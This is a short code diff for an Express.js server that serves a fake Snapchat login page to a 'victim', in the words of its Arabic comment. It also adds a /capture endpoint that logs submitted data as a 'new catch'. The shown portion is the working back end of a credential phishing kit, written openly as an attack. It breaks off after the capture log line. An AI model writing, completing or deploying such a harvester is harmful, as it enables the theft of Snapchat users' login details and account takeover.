@@ -1,7 +1,12 @@
 const express = require('express');
+const path = require('path');
 const app = express();
 app.use(express.json());
-app.use(express.static('.')); // عشان يشغل ملف index.html
+
+// هذا السطر هو اللي بيفتح صفحة السناب للضحية
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
 app.post('/capture', (req, res) => {
     console.log("🔥 صيد جديد يا وحش:");
